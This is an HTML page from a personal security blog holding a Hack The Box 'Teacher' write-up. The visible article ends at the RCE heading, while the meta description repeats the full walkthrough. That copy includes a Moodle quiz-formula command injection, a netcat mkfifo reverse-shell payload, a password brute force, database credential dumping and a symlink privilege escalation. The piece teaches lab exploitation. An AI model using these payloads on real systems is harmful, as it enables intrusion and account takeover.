@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Teacher | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Teacher" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &lt;img src=&quot;images/5.png&quot;&gt; there is an onerror attribute to print That&#39;s an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since /home/giovanni/work/tmp has permissions set to 777 , Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross" />
+<meta property="og:description" content="Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &lt;img src=&quot;images/5.png&quot;&gt; there is an onerror attribute to print That&#39;s an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since /home/giovanni/work/tmp has permissions set to 777 , Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/teacher/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/teacher/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/teacher/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-20T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Teacher","dateModified":"2019-04-20T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/teacher/","datePublished":"2019-04-20T00:00:00+02:00","image":"http://localhost:4000/hackthebox/teacher/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/teacher/"},"description":"Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &lt;img src=&quot;images/5.png&quot;&gt; there is an onerror attribute to print That&#39;s an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;*()_-+=.?/\\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since /home/giovanni/work/tmp has permissions set to 777 , Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Teacher</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-04-20T00:00:00+02:00" itemprop="datePublished">Apr 20, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys--today-teacher-retired-and-here-is-my-write-up-about-it-i-dont-have-too-much-to-say-about-this-box-it-was-an-easy-regular-machine--we-will-exploit-an-authenticated-remote-code-execution-in-a-vulnerable-version-of-a-web-application-called-moodle-to-get-an-initial-shell-on-the-box-and-for-privilege-escalation-we-will-find-a-directory-which-permissions-are-set-to-read--write-and-execute-by-anyone--and-from-there-we-can-create-a-symlink-to-root-or-anything-else-we-want-to-access-its-a-linux-box-and-its-ip-is-101010153-i-added-it-to-etchosts-as-teacherhtb-lets-jump-right-in-">Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to <code class="highlighter-rouge">/root</code> or anything else we want to access. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.153</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">teacher.htb</code>. Let’s jump right in !</h4>
+<p><img src="/images/hackthebox/teacher/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC teacher.htb</code>
+<img src="/images/hackthebox/teacher/1.png" alt="" /></p>
+<h4 id="we-only-see-http-running-on-port-80-lets-see-whats-in-there">We only see http running on port 80. Let’s see what’s in there.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
+<p><img src="/images/hackthebox/teacher/2.png" alt="" /></p>
+<h4 id="there-is-just-a-static-website-titled-blackhat-highschool--i-looked-into-other-pages-like-courses--students-etc-and-also-checked-their-source-code-and-on-gallery-">There is just a static website titled <code class="highlighter-rouge">Blackhat highschool</code> , I looked into other pages like <code class="highlighter-rouge">Courses</code> , <code class="highlighter-rouge">Students</code> etc… And also checked their source code. And on <code class="highlighter-rouge">Gallery</code> :</h4>
+<p><img src="/images/hackthebox/teacher/3.png" alt="" /></p>
+<h4 id="i-found-this-line-in-the-source-">I found this line in the source :</h4>
+<p><img src="/images/hackthebox/teacher/4.png" alt="" /></p>
+<h4 id="for-img-srcimages5png-there-is-an-onerror-attribute-to-print-thats-an-f-in-the-console-so-i-checked-the-console-">for <code class="highlighter-rouge">&lt;img src="images/5.png"&gt;</code> there is an <code class="highlighter-rouge">onerror</code> attribute to print <code class="highlighter-rouge">That's an F</code> in the console. So I checked the console :</h4>
+<p><img src="/images/hackthebox/teacher/5.png" alt="" /></p>
+<h4 id="weird-lets-check-that-image-httpteacherhtbimages5png-">Weird let’s check that image. <code class="highlighter-rouge">http://teacher.htb/images/5.png</code> :</h4>
+<p><img src="/images/hackthebox/teacher/6.png" alt="" /></p>
+<h4 id="corrupted-file--lets-check-if-its-really-a-corrupted-image-or-its-not-an-image-at-all-">Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all :</h4>
+<p><code class="highlighter-rouge">curl http://teacher.htb/images/5.png</code>
+<img src="/images/hackthebox/teacher/7.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hi Servicedesk,
+
+I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 
+
+Could you guys figure out what the last charachter is, or just reset it?                                                                   
+
+Thanks,
+Giovanni
+</code></pre></div></div>
+<h4 id="nice--we-have-a-username-and-a-password-but-we-still-need-to-figure-out-the-last-character-but-where-will-we-use-these-credentials-anyway--i-ran-gobuster-with-usrsharewordlistsdirbusterdirectory-list-23-mediumtxt-in-the-background-and-got-some-results--one-of-them-was-moodle">Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with <code class="highlighter-rouge">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> in the background and got some results , one of them was <code class="highlighter-rouge">/moodle</code>.</h4>
+<p><code class="highlighter-rouge">http://teacher.htb/moodle</code>
+<img src="/images/hackthebox/teacher/8.png" alt="" /></p>
+<blockquote>
+  <p>Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License  -<a href="https://en.wikipedia.org/wiki/Moodle">Wikipedia</a></p>
+</blockquote>
+
+<h4 id="on-the-login-page-theres-a-guest-login-">On the login page there’s a guest login :</h4>
+<p><img src="/images/hackthebox/teacher/9.png" alt="" /></p>
+<h4 id="however-i-couldnt-achieve-anything-from-that-guest-login">However I couldn’t achieve anything from that guest login.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="bruteforcing-the-last-character">Bruteforcing the last character</h3>
+<h4 id="we-have-the-credentials-but-we-need-to-figure-out-the-last-character-of-the-password-i-created-a-list-of-numbers--letters-and-special-chars-and-printed-them-next-to-the-password">We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password.</h4>
+<h4 id="for-i-in-az-do-echo-th4c00ltheachai-done--listtxt-this-will-print-all-the-letters-next-to-th4c00ltheacha"><code class="highlighter-rouge">for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt</code> this will print all the letters next to <code class="highlighter-rouge">Th4C00lTheacha</code></h4>
+<h4 id="then-i-added-some-special-chars-manually-like-_--and-finally-i-added-numbers--for-i-in-09-do-echo-th4c00ltheachai-done--listtxt">Then I added some special chars manually like <code class="highlighter-rouge">!@#$%^&amp;*()_-+=.?/\</code> and finally I added numbers : <code class="highlighter-rouge">for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt</code></h4>
+<h4 id="listtxt-"><code class="highlighter-rouge">list.txt</code> :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Th4C00lTheachaa
+Th4C00lTheachab
+Th4C00lTheachac
+Th4C00lTheachad
+Th4C00lTheachae
+Th4C00lTheachaf
+Th4C00lTheachag
+Th4C00lTheachah
+Th4C00lTheachai
+Th4C00lTheachaj
+Th4C00lTheachak
+Th4C00lTheachal
+Th4C00lTheacham
+Th4C00lTheachan
+Th4C00lTheachao
+Th4C00lTheachap
+Th4C00lTheachaq
+Th4C00lTheachar
+Th4C00lTheachas
+Th4C00lTheachat
+Th4C00lTheachau
+Th4C00lTheachav
+Th4C00lTheachaw
+Th4C00lTheachax
+Th4C00lTheachay
+Th4C00lTheachaz
+Th4C00lTheacha!
+Th4C00lTheacha@
+Th4C00lTheacha#
+Th4C00lTheacha$
+Th4C00lTheacha%
+Th4C00lTheacha^
+Th4C00lTheacha&amp;
+Th4C00lTheacha*
+Th4C00lTheacha(
+Th4C00lTheacha)
+Th4C00lTheacha_
+Th4C00lTheacha-
+Th4C00lTheacha+
+Th4C00lTheacha=
+Th4C00lTheacha.
+Th4C00lTheacha?
+Th4C00lTheacha/
+Th4C00lTheacha\
+Th4C00lTheacha0
+Th4C00lTheacha1
+Th4C00lTheacha2
+Th4C00lTheacha3
+Th4C00lTheacha4
+Th4C00lTheacha5
+Th4C00lTheacha6
+Th4C00lTheacha7
+Th4C00lTheacha8
+Th4C00lTheacha9
+</code></pre></div></div>
+<h4 id="since-its-a-small-list--i-used-burp-intruder-to-bruteforce-the-password-lets-intercept-the-request-and-send-it-to-intruder-">Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder :</h4>
+<p><img src="/images/hackthebox/teacher/10.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/11.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/12.png" alt="" /></p>
+<h4 id="after-its-finished--all-the-responses-were-870-bytes-in-length-except-the-response-of-the-payload-th4c00ltheacha">After it’s finished , all the responses were 870 bytes in length except the response of the payload <code class="highlighter-rouge">Th4C00lTheacha#</code>.</h4>
+<p><img src="/images/hackthebox/teacher/13.png" alt="" /></p>
+<h4 id="so-probably-this-is-the-right-password--lets-check">So probably this is the right password , let’s check.</h4>
+<p><img src="/images/hackthebox/teacher/14.png" alt="" /></p>
+<h4 id="it-worked-and-now-we-are-in-as-giovanni">It worked and now we are in as <code class="highlighter-rouge">Giovanni</code></h4>
+<p><br /></p>
+<hr />
+
+<h3 id="rce--initial-shell-as-www-data">RCE , Initial Shell as <code class="highlighter-rouge">www-data</code></h3>
